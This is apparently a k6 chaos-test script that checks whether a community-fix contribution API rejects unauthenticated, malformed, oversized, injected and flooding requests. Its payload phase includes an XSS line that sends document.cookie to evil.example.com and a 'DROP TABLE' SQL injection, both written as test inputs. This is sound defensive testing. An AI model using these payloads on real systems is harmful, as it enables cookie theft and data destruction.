/**
 * L4 Chaos: Community Fix Abuse
 *
 * The community fix network accepts anonymized patterns via
 * POST /api/patterns/contribute (session auth or Bearer CRON_SECRET).
 * An attacker who gains either auth could inject harmful patterns.
 * This scenario probes the black-box boundary:
 *
 *   1. Unauthenticated requests are 401 (no contribution without auth)
 *   2. Malformed bodies are 400 (structural rejection)
 *   3. Bodies containing secret-shaped strings in patternText /
 *      fixApproach / fixDescription are either rejected (400) or
 *      sanitized (status 200 but we have no way to verify the stored
 *      row from here — marked as "accepted, requires manual review")
 *   4. Oversized bodies get a 4xx, never 5xx
 *   5. Repeated identical bodies hit rate limiting (if configured)
 *      instead of slamming the DB
 *
 * This scenario does not authenticate as a real user — it validates
 * the REJECTION surface. Passes when the auth wall + body validators
 * hold against 30 abuse variants.
 *
 * Required env: BASE_URL, API_TOKEN (optional — used to confirm 401
 * without auth, we deliberately do NOT send the token).
 */

import http from "k6/http";
import { check, sleep, group } from "k6";
import { uuidv4 } from "https://jslib.k6.io/k6-utils/1.4.0/index.js";
import { BASE_URL } from "../lib/helpers.js";
import { CHAOS_THRESHOLDS } from "../lib/thresholds.js";
import { chaosPhasesPassed, chaosPhasesTotal, chaosLatency } from "../lib/metrics.js";
import { Counter } from "k6/metrics";

const abuseRejected4xx = new Counter("community_abuse_4xx");
const abuseAccepted2xx = new Counter("community_abuse_2xx");
const abuse5xx = new Counter("community_abuse_5xx");

export const options = {
  scenarios: {
    community_abuse: {
      executor: "per-vu-iterations",
      vus: 1,
      iterations: 1,
      maxDuration: "3m",
      exec: "communityAbuse",
    },
  },
  thresholds: {
    ...CHAOS_THRESHOLDS,
    "chaos_phases_passed": ["count>=3"],
    "community_abuse_5xx": ["count<1"],
  },
  tags: { scenario: "chaos-community-fix-abuse" },
};

const ENDPOINT = `${BASE_URL}/api/patterns/contribute`;

function postAbuse(body, extraHeaders = {}) {
  return http.post(ENDPOINT, typeof body === "string" ? body : JSON.stringify(body), {
    headers: { "Content-Type": "application/json", ...extraHeaders },
    tags: { type: "community-abuse" },
    timeout: "30s",
  });
}

function phase(name, fn) {
  return group(name, () => {
    const start = Date.now();
    chaosPhasesTotal.add(1);
    let passed = false;
    try { passed = fn(); } catch (e) { console.error(`Phase ${name} threw: ${e}`); }
    chaosLatency.add(Date.now() - start);
    if (passed) chaosPhasesPassed.add(1);
    return passed;
  });
}

function classify(status) {
  if (status >= 500) abuse5xx.add(1);
  else if (status >= 400) abuseRejected4xx.add(1);
  else if (status >= 200 && status < 300) abuseAccepted2xx.add(1);
}

export function communityAbuse() {
  // ── Phase 1: unauthenticated → 401 ─────────────────────────────────
  phase("1_unauthenticated_401", () => {
    const res = postAbuse({
      fingerprint: "abc",
      patternText: "test",
      category: "test",
      fixApproach: "test",
      fixDescription: "test",
      confidence: 90,
    });
    classify(res.status);
    return check(res, {
      "unauthenticated request is 401": (r) => r.status === 401,
    });
  });

  // ── Phase 2: bad JSON + missing fields → 400 ───────────────────────
  phase("2_malformed_bodies_400", () => {
    const variants = [
      "not json{{{",
      "",
      "null",
      JSON.stringify({}),
      JSON.stringify({ fingerprint: "x" }),
      JSON.stringify({ fingerprint: "x", patternText: "" }),
    ];
    let rejected = 0;
    for (const v of variants) {
      const res = postAbuse(v);
      classify(res.status);
      if (res.status === 400 || res.status === 401) rejected++;
      sleep(0.1);
    }
    return check(null, {
      "malformed bodies rejected": () => rejected === variants.length,
    });
  });

  // ── Phase 3: secret-shaped strings + oversized + injection ────────
  phase("3_payload_abuse", () => {
    const fakeSecret = "ghp_" + "A".repeat(36); // github PAT shape
    const fakeAws = "AKIA" + "Q".repeat(16);
    const oversizedPattern = "X".repeat(200_000); // 200 KiB
    const htmlInjection = "<script>fetch('https://evil.example.com/exfil?c='+document.cookie)</script>";
    const sqlInjection = "'; DROP TABLE error_patterns; --";
    const abusive = [
      { label: "fake-pat-secret",  patternText: `We found ${fakeSecret} in source.` },
      { label: "fake-aws-secret",  patternText: `AWS key ${fakeAws} leaked.` },
      { label: "oversized-body",   patternText: oversizedPattern },
      { label: "html-injection",   fixDescription: htmlInjection },
      { label: "sql-injection",    fixApproach: sqlInjection },
      { label: "huge-fingerprint", fingerprint: "Z".repeat(10_000) },
      { label: "neg-confidence",   confidence: -99999 },
      { label: "nan-confidence",   confidence: "not a number" },
    ];
    let okBoundary = 0;
    for (const a of abusive) {
      const body = {
        fingerprint: a.fingerprint ?? uuidv4(),
        patternText: a.patternText ?? "stack trace excerpt",
        category: "runtime",
        fixApproach: a.fixApproach ?? "add null check",
        fixDescription: a.fixDescription ?? "prevents the crash",
        confidence: a.confidence ?? 80,
      };
      const res = postAbuse(body);
      classify(res.status);
      // Acceptable outcomes: 400 (validator caught it), 401 (no auth,
      // which is actually the expected response here since k6 has no
      // session cookie), 413 (payload too large), 429 (rate limited).
      // Unacceptable: 5xx.
      if (res.status < 500) okBoundary++;
      sleep(0.1);
    }
    return check(null, {
      "payload abuse never 5xx": () => okBoundary === abusive.length,
    });
  });

  // ── Phase 4: repeated identical body → rate limit or auth reject ──
  phase("4_flood", () => {
    const payload = JSON.stringify({
      fingerprint: "flood-abc",
      patternText: "flood",
      category: "runtime",
      fixApproach: "flood",
      fixDescription: "flood",
      confidence: 50,
    });
    let okBoundary = 0;
    for (let i = 0; i < 50; i++) {
      const res = http.post(ENDPOINT, payload, {
        headers: { "Content-Type": "application/json" },
        tags: { type: "community-abuse", phase: "flood" },
      });
      classify(res.status);
      if (res.status < 500) okBoundary++;
      sleep(0.02);
    }
    return check(null, {
      "50-rq flood never 5xx": () => okBoundary === 50,
    });
  });
}
